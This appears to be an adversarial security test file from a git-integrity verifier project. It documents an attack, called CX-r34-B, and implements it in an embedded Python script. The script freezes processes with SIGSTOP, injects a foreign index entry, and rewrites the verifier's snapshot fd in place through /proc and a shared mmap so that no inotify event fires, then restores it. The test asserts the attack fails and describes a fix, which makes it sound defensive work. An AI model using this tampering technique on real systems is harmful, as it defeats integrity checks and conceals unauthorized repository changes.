/*
RFC-1616 round-34 independent adversarial probe — candidate commit
0245bf867, exported tree.

CX-r34-B — `verifyAnchoredMutationCoverage`'s fd-form liveIndex
guards its O_TMPFILE snapshot with `fsWatch("/proc/self/fd/<fd>")`
(:4628) plus `finish()`'s size+byte readback (:4739-4748). Both
layers are write(2)-shaped: inotify reports IN_MODIFY for pwrite but
NOT for stores through a shared mapping, and the settle compare
only sees the bytes as they stand at read time — no fstat ctime pin
exists on the fd form (verified: mmap store bumps the in-memory
inode ctime immediately, so one WOULD catch this).

Attack shape (CX-r33-B re-landed through the inotify-blind
primitive — same-size in-place rewrite, never an ftruncate):

  1. Freeze the anchored `add -A -- .` child on first /proc sight;
     freeze the verifier; inject a foreign stage `x/evil.txt` via
     `update-index --cacheinfo` (retrying through the op's index.lock
     window so the entry lands in the post-op index before the
     verifier's indexPin/snapshot); release both.
  2. The verifier copies the real index into the O_TMPFILE liveIndex
     — the foreign entry is inside the judged snapshot.
  3. The hijacker spots the first coverage child (`ls-files -s`),
     SIGSTOPs it pre-index-read, opens `/proc/<vpid>/fd/N` O_RDWR,
     mmap()s it MAP_SHARED, and REWRITES THE ENTRY IN PLACE:
     `x/evil.txt` (10 chars) → `zzzzzzzzzz` — an untracked worktree
     file of the same name length — with the oid field set to
     `zzzzzzzzzz`'s worktree blob; sha1 trailer re-sealed. Same
     size, no ftruncate, no write() → ZERO inotify events.
     SIGCONTs the child.
  4. `liveMap` gains a second clean `zzzzzzzzzz` entry and LOSES
     `x/evil.txt` → `x/evil.txt` never enters `changed` → the later
     `diff` child (running on the restored image, which honestly
     reports `x/evil.txt` drift) is never consulted for it — the
     changed-set loop only looks at paths inside `changed`.
  5. On the child's exit the hijacker freezes the verifier, restores
     the original bytes through the SAME mapping, unfreezes.
     `finish()`'s readback attests the untouched snapshot and
     `liveIndexDirty` was never set → coverage passes.

Honest outcomes: refused = exitCode -1 (EVIDENCE-REFUSED); honest =
foreign stage absent/clobbered mid-op or coverage exits non-zero;
forged = `add` exits 0 while `x/evil.txt` remains staged at the
attacker blob in the REAL `.git/index`.

Fix: the liveIndex fd is `fchmod`ed `0400` at mint — the O_RDWR
`/proc/<vpid>/fd` open is EACCES, so no store primitive reaches the
inode. The `chmodat` reopen escape bumps ctime into the `ctimeNs`
settle pin and fires IN_ATTRIB on the armed `/proc/self/fd` watch.
*/

import { execFileSync, spawn, spawnSync } from "node:child_process";
import { constants as fsConstants, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import os from "node:os";
import path from "node:path";
import { afterEach, describe, expect, it } from "vitest";

import { evidenceAnchoredGit, evidenceRepoPreflight } from "../../../src/utils/verifier-git.ts";

// This Node build omits `O_TMPFILE` from `fs.constants` even though the
// kernel supports it — the production fd-form liveIndex branch
// (:4592-4597) is the one this probe exercises (cx33b convention).
(fsConstants as { O_TMPFILE?: number }).O_TMPFILE = 0o20200000;

const tmpdirs: string[] = [];
afterEach(() => {
  while (tmpdirs.length > 0) rmSync(tmpdirs.pop()!, { recursive: true, force: true });
});

const git = (root: string, args: string[], input?: string) =>
  execFileSync("git", ["-C", root, ...args], { encoding: "utf8", input }).trim();

const HAS_PY = spawnSync("python3", ["--version"]).status === 0;

const mkRepo = () => {
  const root = mkdtempSync(path.join(os.tmpdir(), "cx34b-"));
  tmpdirs.push(root);
  execFileSync("git", ["init", "-q", "-b", "main", root]);
  git(root, ["config", "user.email", "t@t"]);
  git(root, ["config", "user.name", "t"]);
  writeFileSync(path.join(root, "f.txt"), "v1\n");
  git(root, ["add", "f.txt"]);
  git(root, ["commit", "-qm", "c1"]);
  return root;
};

/**
 * One python helper owns every signal (cx33b convention):
 *  phase 1 — on the `git add` child: freeze the verifier, retry the
 *    `update-index --cacheinfo` injection for a bounded window,
 *    unfreeze.
 *  phase 2 — on the FIRST `ls-files -s` child: freeze it and the
 *    verifier, open /proc/<vpid>/fd/N O_RDWR, mmap MAP_SHARED, rewrite
 *    `x/evil.txt`'s entry in place to `zzzzzzzzzz`@decoy-oid
 *    (same size — no write(2), no ftruncate, no inotify event),
 *    unfreeze both; on the child's exit freeze the verifier again,
 *    restore the original image through the SAME mapping, unfreeze.
 */
const startHijacker = (
  vpid: number,
  injectCmd: string,
  decoyOidHex: string,
  secs = 90,
  logPath?: string,
) => {
  const script =
    "import os,sys,time,struct,hashlib,mmap\n" +
    "vpid=int(sys.argv[1]); cmd=sys.argv[2]; mark=b'x/evil.txt'; repl=b'zzzzzzzzzz'; doid=bytes.fromhex(sys.argv[3]); end=time.time()+float(sys.argv[4]); log=open(sys.argv[5],'a')\n" +
    "me=str(os.getpid()); injected=False; flipped=False; restored=False; orig=None; tfd=None; t0=time.time()\n" +
    "def lg(m): log.write('%.1f %s\\n'%((time.time()-t0)*1000,m)); log.flush()\n" +
    "def kids():\n" +
    "    out=[]\n" +
    "    try:\n" +
    "        for t in os.listdir('/proc/%s/task'%vpid):\n" +
    "            try: out += open('/proc/%s/task/%s/children'%(vpid,t)).read().split()\n" +
    "            except: pass\n" +
    "    except: pass\n" +
    "    return out\n" +
    "def argv(k):\n" +
    "    try: return open('/proc/%s/cmdline'%k,'rb').read().split(b'\\0')\n" +
    "    except: return []\n" +
    "def rewrite(body):\n" +
    "    n=struct.unpack('>I',body[8:12])[0]; off=12\n" +
    "    for i in range(n):\n" +
    "        nlen=struct.unpack('>H',body[off+60:off+62])[0]&0xFFF\n" +
    "        name=body[off+62:off+62+nlen]\n" +
    "        if name==mark and len(repl)==nlen:\n" +
    "            b=bytearray(body)\n" +
    "            b[off+40:off+60]=doid\n" +
    "            b[off+62:off+62+nlen]=repl\n" +
    "            body=bytes(b)\n" +
    "            return body[:-20]+hashlib.sha1(body[:-20]).digest()\n" +
    "        off+=(62+nlen+8)//8*8\n" +
    "    return body\n" +
    "def findfd():\n" +
    "    try: names=os.listdir('/proc/%s/fd'%vpid)\n" +
    "    except: return None\n" +
    "    for n in names:\n" +
    "        try:\n" +
    "            if '(deleted)' not in os.readlink('/proc/%s/fd/%s'%(vpid,n)): continue\n" +
    "            os.chmod('/proc/%s/fd/%s'%(vpid,n),0o600)\n" +
    "            f=os.open('/proc/%s/fd/%s'%(vpid,n), os.O_RDWR)\n" +
    "        except: continue\n" +
    "        try:\n" +
    "            if os.pread(f,4,0)!=b'DIRC': os.close(f); continue\n" +
    "            sz=os.fstat(f).st_size\n" +
    "            if mark in os.pread(f,sz,0): return f\n" +
    "            os.close(f)\n" +
    "        except: continue\n" +
    "    return None\n" +
    "while time.time()<end and not restored:\n" +
    "    ks=kids()\n" +
    "    if not injected:\n" +
    "        for k in ks:\n" +
    "            if k==me: continue\n" +
    "            av=argv(k)\n" +
    "            if b'add' in av:\n" +
    "                try: os.kill(vpid,19)\n" +
    "                except: pass\n" +
    "                dl=time.time()+2.0\n" +
    "                while time.time()<dl:\n" +
    "                    os.system(cmd)\n" +
    "                    time.sleep(0.0005)\n" +
    "                try: os.kill(vpid,18)\n" +
    "                except: pass\n" +
    "                injected=True; lg('injected')\n" +
    "        time.sleep(0.00002)\n" +
    "    elif not flipped:\n" +
    "        for k in ks:\n" +
    "            if k==me: continue\n" +
    "            av=argv(k)\n" +
    "            if b'ls-files' in av and b'-s' in av:\n" +
    "                try: os.kill(int(k),19)\n" +
    "                except: continue\n" +
    "                try: os.kill(vpid,19)\n" +
    "                except: pass\n" +
    "                f=findfd()\n" +
    "                if f is not None:\n" +
    "                    try:\n" +
    "                        sz=os.fstat(f).st_size\n" +
    "                        m=mmap.mmap(f,sz)\n" +
    "                        orig=m[:]\n" +
    "                        img=rewrite(orig)\n" +
    "                        m[:]=img\n" +
    "                        tfd=(f,m); flipped=True; lg('flipped child=%s sz=%d'%(k,sz))\n" +
    "                    except Exception as e:\n" +
    "                        lg('fliperr %s'%e)\n" +
    "                        try: os.close(f)\n" +
    "                        except: pass\n" +
    "                try: os.kill(vpid,18)\n" +
    "                except: pass\n" +
    "                try: os.kill(int(k),18)\n" +
    "                except: pass\n" +
    "                if flipped:\n" +
    "                    for _ in range(60000):\n" +
    "                        if not os.path.exists('/proc/%s'%k): break\n" +
    "                        time.sleep(0.00005)\n" +
    "                    try: os.kill(vpid,19)\n" +
    "                    except: pass\n" +
    "                    try:\n" +
    "                        tfd[1][:]=orig\n" +
    "                        restored=True; lg('restored')\n" +
    "                    except Exception as e: lg('restoreerr %s'%e)\n" +
    "                    try: os.kill(vpid,18)\n" +
    "                    except: pass\n" +
    "                break\n" +
    "        time.sleep(0.00002)\n" +
    "    else:\n" +
    "        time.sleep(0.0001)\n" +
    "lg('exit injected=%s flipped=%s restored=%s'%(injected,flipped,restored))\n";
  const child = spawn(
    "python3",
    [
      "-c",
      script,
      String(vpid),
      injectCmd,
      decoyOidHex,
      String(secs),
      logPath ?? "/tmp/cx34b-trace.txt",
    ],
    { stdio: "ignore" },
  );
  child.unref();
  return {
    stop: () => {
      try {
        child.kill("SIGKILL");
      } catch {
        /* done */
      }
    },
  };
};

describe("CX-r34-B: mmap(MAP_SHARED) flip→restore on the liveIndex fd is watch- and compare-invisible — foreign stage laundered past coverage", () => {
  it(
    "forged liveIndex during `ls-files -s` hides the foreign stage — anchored `add` exits 0 with it staged",
    { timeout: 300_000 },
    async (ctx) => {
      if (!HAS_PY) return ctx.skip();
      let forged = 0;
      let refused = 0;
      let honest = 0;
      let lastErr = "";
      for (let attempt = 0; attempt < 30; attempt++) {
        const root = mkRepo();
        writeFileSync(path.join(root, "new.txt"), "n\n");
        // Decoy: a real untracked worktree file with the same name
        // length as `x/evil.txt` (10 chars) and clean worktree bytes —
        // its blob replaces the foreign stage's oid in the forged image.
        writeFileSync(path.join(root, "zzzzzzzzzz"), "z\n");
        const decoyOid = git(root, ["hash-object", "-w", "--stdin"], "z\n");
        const foreign = git(root, ["hash-object", "-w", "--stdin"], "FORGED\n");
        const log = `/tmp/cx34b-trace-${attempt}.txt`;
        const hijack = startHijacker(
          process.pid,
          `git -C '${root}' update-index --add --cacheinfo 100644,${foreign},x/evil.txt`,
          decoyOid,
          90,
          log,
        );
        try {
          const pre = await evidenceRepoPreflight(root);
          expect(pre).not.toBeNull();
          const r = await evidenceAnchoredGit(root, ["add", "-A", "--", "."], {
            preflight: pre!,
          });
          if (r.exitCode === -1) {
            refused++;
            lastErr = r.stderr.slice(0, 160);
          } else {
            let staged = "";
            try {
              staged = git(root, ["rev-parse", ":x/evil.txt"]);
            } catch {
              staged = "";
            }
            if (r.exitCode === 0 && staged === foreign) forged++;
            else honest++;
          }
        } finally {
          hijack.stop();
        }
      }
      console.log(
        `liveIndex mmap flip on ls-files -s (anchored add): forged=${forged} refused=${refused} honest=${honest} last=${lastErr}`,
      );
      expect(forged).toBe(0);
    },
  );
});
